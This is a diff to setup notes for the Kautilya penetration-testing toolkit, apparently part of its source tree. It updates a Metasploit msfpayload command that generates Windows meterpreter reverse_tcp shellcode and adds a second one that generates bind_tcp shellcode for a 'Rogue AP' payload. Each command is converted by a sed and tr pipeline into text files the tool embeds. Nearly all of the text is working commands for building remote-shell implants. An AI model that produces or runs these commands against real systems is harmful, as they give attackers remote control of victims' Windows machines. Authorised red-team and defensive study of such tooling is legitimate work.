@@ -3,4 +3,10 @@
 #on exploit-monday blog by Matt and below command is adopted from a comment on the blog.
 #The generated shellcode powershell_codeexec.txt is to be copied to src directory of Kautilya.
 
-./msfpayload windows/meterpreter/reverse_tcp LHOST=<IP> EXITFUNC=process C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'> powershell_codeexec.txt
+./msfpayload windows/meterpreter/reverse_tcp LHOST=<IP> EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'> powershell_codeexec.txt
+
+
+#For Rogue AP payload, use below command. The generated shellcode file should be copied to the src directory of Kautilya.
+#Here LPORT would be the port provided as an option to Kautilya while generating Rogue AP payload.
+
+./msfpayload windows/meterpreter/bind_tcp LPORT=<Port> EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'> rogue_ap.txt
